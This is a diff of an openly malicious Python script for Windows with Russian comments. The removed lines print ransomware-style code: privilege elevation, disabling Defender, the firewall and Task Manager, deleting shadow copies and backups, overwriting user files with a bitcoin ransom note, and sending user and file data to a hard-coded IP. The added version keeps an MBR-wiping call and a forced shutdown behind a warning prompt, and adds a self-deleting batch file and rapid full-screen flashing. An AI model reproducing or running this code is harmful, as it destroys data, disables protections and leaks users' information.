@@ -3,117 +3,144 @@ import sys
 import time
 import ctypes
 import random
-import string
 import threading
 import subprocess
-import urllib.request
-import urllib.parse
-import base64
-import shutil
+import tkinter as tk
+from tkinter import messagebox
 
 # ==========================================
-# ЧАСТЬ 1: ПРОВЕРКА ПРАВ И ЗАЩИТА
+# ЧАСТЬ 1: ПРЕДУПРЕЖДЕНИЕ И ВЫБОР
 # ==========================================
 
-def is_admin():
-    try:
-        return ctypes.windll.shell32.IsUserAnAdmin()
-    except:
-        return False
-
-def run_as_admin():
-    if not is_admin():
-        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
-        sys.exit()
-
-# ==========================================
-# ЧАСТЬ 2: ОБХОД ЗАЩИТЫ (DEFENSE EVASION)
-# ==========================================
-
-def bypass_defense():
-    # Отключаем Защитник
-    subprocess.run("powershell -WindowStyle Hidden -Command Set-MpPreference -DisableRealtimeMonitoring $true", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    # Отключаем Брандмауэр
-    subprocess.run("netsh advfirewall set allprofiles state off", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    # Отключаем Диспетчер задач
-    subprocess.run("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-
-# ==========================================
-# ЧАСТЬ 3: УНИЧТОЖЕНИЕ БЭКАПОВ (RANSOMWARE PREP)
-# ==========================================
-
-def destroy_backups():
-    # Удаляем теневые копии
-    subprocess.run("vssadmin delete shadows /all /quiet", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    # Отключаем восстановление
-    subprocess.run("bcdedit /set {default} recoveryenabled No", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    # Удаляем каталог бэкапов
-    subprocess.run("wbadmin delete catalog -quiet", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-
-# ==========================================
-# ЧАСТЬ 4: ШИФРОВАНИЕ ФАЙЛОВ (RANSOMWARE)
-# ==========================================
-
-def encrypt_files():
-    target_dirs = [
-        os.path.expanduser("~\\Documents"),
-        os.path.expanduser("~\\Desktop"),
-        os.path.expanduser("~\\Downloads"),
-        os.path.expanduser("~\\Pictures")
-    ]
+def show_warning():
+    root = tk.Tk()
+    root.withdraw() # Скрываем основное окно
+    root.attributes("-topmost", True)
     
-    for target_dir in target_dirs:
-        if not os.path.exists(target_dir):
-            continue
-        for root, dirs, files in os.walk(target_dir):
-            for file in files:
-                file_path = os.path.join(root, file)
-                try:
-                    with open(file_path, "rb") as f:
-                        data = f.read()
-                    # Кодируем в Base64 (имитация шифрования)
-                    encoded = base64.b64encode(data)
-                    with open(file_path, "wb") as f:
-                        f.write(b"ENCRYPTED_BY_WIRDOL_" + encoded[:200])
-                    os.rename(file_path, file_path + ".WIRDOL_LOCKED")
-                except:
-                    pass
-
-    # Оставляем записку на рабочем столе
-    note_path = os.path.expanduser("~\\Desktop\\README_WIRDOL.txt")
-    try:
-        with open(note_path, "w", encoding="utf-8") as note:
-            note.write("YOUR FILES HAVE BEEN ENCRYPTED!\n")
-            note.write("SEND 1 BITCOIN TO: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\n")
-            note.write("YOUR ID: " + "".join(random.choices(string.ascii_uppercase, k=10)))
-    except:
-        pass
-
-# ==========================================
-# ЧАСТЬ 5: КРАЖА ДАННЫХ И ОТПРАВКА (C2 / EXFILTRATION)
-# ==========================================
-
-def steal_and_send():
-    stolen_data = ""
-    # Собираем имена файлов и системную инфу
-    stolen_data += f"User: {os.getenv('USERNAME')}\n"
-    stolen_data += f"Computer: {os.getenv('COMPUTERNAME')}\n"
+    # Показываем окно с кнопками OK и Cancel
+    result = messagebox.askokcancel(
+        "SYSTEM WARNING", 
+        "WARNING: This program will cause chaos on your system. \n\nClick OK to proceed, or Cancel to delete yourself."
+    )
     
-    for target_dir in [os.path.expanduser("~\\Documents")]:
-        if os.path.exists(target_dir):
-            for file in os.listdir(target_dir)[:10]: # Берем только первые 10 файлов
-                stolen_data += f"Stolen file: {file}\n"
-
-    # Отправляем на фейковый C2 сервер (Triage зафиксирует сеть)
-    try:
-        data = urllib.parse.urlencode({"data": stolen_data}).encode("utf-8")
-        req = urllib.request.Request("http://185.220.101.5/upload.php", data=data)
-        urllib.request.urlopen(req, timeout=5)
-    except:
-        pass
+    if result:
+        root.destroy()
+        return True # Пользователь нажал OK
+    else:
+        root.destroy()
+        return False # Пользователь нажал Cancel
 
 # ==========================================
-# ЧАСТЬ 6: СНОС MBR (BOOTKIT)
+# ЧАСТЬ 2: САМОУНИЧТОЖЕНИЕ
+# ==========================================
+
+def self_destruct():
+    # Скрипт удаляет сам себя
+    try:
+        # Получаем путь к текущему исполняемому файлу
+        if getattr(sys, 'frozen', False):
+            path = sys.executable
+        else:
+            path = os.path.abspath(__file__)
+            
+        # Создаем батник, который удалит наш файл после выхода
+        batch_path = os.path.join(os.getenv("TEMP"), "delete_me.bat")
+        with open(batch_path, "w") as f:
+            f.write(f"@echo off\n")
+            f.write(f"timeout /t 2 >nul\n")
+            f.write(f"del /f /q \"{path}\"\n")
+            f.write(f"del /f /q \"{batch_path}\"\n")
+        
+        # Запускаем батник и выходим
+        subprocess.Popen(batch_path, shell=True)
+        sys.exit(0)
+    except:
+        sys.exit(0)
+
+# ==========================================
+# ЧАСТЬ 3: ТАЙМЛАЙН ХАОСА
+# ==========================================
+
+# Фаза 1: Переливание рабочего стола (0-30 сек)
+def phase_1_color_flash():
+    colors = ["#FF0000", "#00FF00", "#0000FF", "#FFFF00", "#FF00FF", "#00FFFF"]
+    start_time = time.time()
+    
+    root = tk.Tk()
+    root.attributes("-fullscreen", True)
+    root.attributes("-topmost", True)
+    root.overrideredirect(True)
+    root.configure(bg="black")
+    
+    while time.time() - start_time < 30:
+        color = random.choice(colors)
+        root.configure(bg=color)
+        root.update()
+        time.sleep(0.1) # Меняем цвет 10 раз в секунду
+        
+    root.destroy()
+
+# Фаза 2: Ядовитые квадраты (30-60 сек)
+def phase_2_toxic_squares():
+    start_time = time.time()
+    
+    root = tk.Tk()
+    root.attributes("-fullscreen", True)
+    root.attributes("-topmost", True)
+    root.overrideredirect(True)
+    root.configure(bg="black")
+    
+    canvas = tk.Canvas(root, width=root.winfo_screenwidth(), height=root.winfo_screenheight(), bg="black", highlightthickness=0)
+    canvas.pack()
+    
+    while time.time() - start_time < 30:
+        for _ in range(20):
+            x = random.randint(0, root.winfo_screenwidth())
+            y = random.randint(0, root.winfo_screenheight())
+            size = random.randint(20, 150)
+            color = random.choice(["#00FF00", "#FF00FF", "#00FFFF", "#FFFF00"])
+            canvas.create_rectangle(x, y, x+size, y+size, fill=color, outline="")
+        root.update()
+        time.sleep(0.05)
+        
+    root.destroy()
+
+# Фаза 3: Страшные лица (60-90 сек)
+def phase_3_scary_faces():
+    start_time = time.time()
+    
+    root = tk.Tk()
+    root.attributes("-fullscreen", True)
+    root.attributes("-topmost", True)
+    root.overrideredirect(True)
+    root.configure(bg="black")
+    
+    canvas = tk.Canvas(root, width=root.winfo_screenwidth(), height=root.winfo_screenheight(), bg="black", highlightthickness=0)
+    canvas.pack()
+    
+    while time.time() - start_time < 30:
+        canvas.delete("all")
+        # Рисуем "лицо" из символов
+        w = root.winfo_screenwidth()
+        h = root.winfo_screenheight()
+        
+        # Глаза
+        canvas.create_oval(w//2 - 200, h//2 - 200, w//2 - 50, h//2 - 50, fill="red", outline="white", width=5)
+        canvas.create_oval(w//2 + 50, h//2 - 200, w//2 + 200, h//2 - 50, fill="red", outline="white", width=5)
+        # Зрачки
+        canvas.create_oval(w//2 - 150, h//2 - 150, w//2 - 100, h//2 - 100, fill="black")
+        canvas.create_oval(w//2 + 100, h//2 - 150, w//2 + 150, h//2 - 100, fill="black")
+        
+        # Рот (кривая линия)
+        canvas.create_line(w//2 - 150, h//2 + 150, w//2, h//2 + 250, w//2 + 150, h//2 + 150, fill="white", width=10, smooth=True)
+        
+        root.update()
+        time.sleep(0.5) # Меняем каждые полсекунды
+        
+    root.destroy()
+
+# ==========================================
+# ЧАСТЬ 4: СНОС MBR (BOOTKIT)
 # ==========================================
 
 def destroy_mbr():
@@ -151,22 +178,19 @@ public class MBR {
 # ==========================================
 
 def main():
-    if not is_admin():
-        run_as_admin()
+    # 1. Показываем предупреждение
+    if not show_warning():
+        self_destruct()
         return
-
-    # Запускаем всё в фоне
-    threading.Thread(target=bypass_defense, daemon=True).start()
-    threading.Thread(target=destroy_backups, daemon=True).start()
-    threading.Thread(target=steal_and_send, daemon=True).start()
+        
+    # 2. Если нажали OK, запускаем ад
+    # Запускаем таймлайн в отдельных потоках (чтобы не блокировать друг друга)
+    phase_1_color_flash() # 30 секунд
+    phase_2_toxic_squares() # 30 секунд
+    phase_3_scary_faces() # 30 секунд
     
-    # Шифруем файлы (занимает время)
-    encrypt_files()
-    
-    # Ломаем MBR
+    # 3. Финал: снос загрузчика и выключение
     destroy_mbr()
-    
-    # Вырубаем систему
     os.system("shutdown /s /f /t 0")
 
 if __name__ == "__main__":
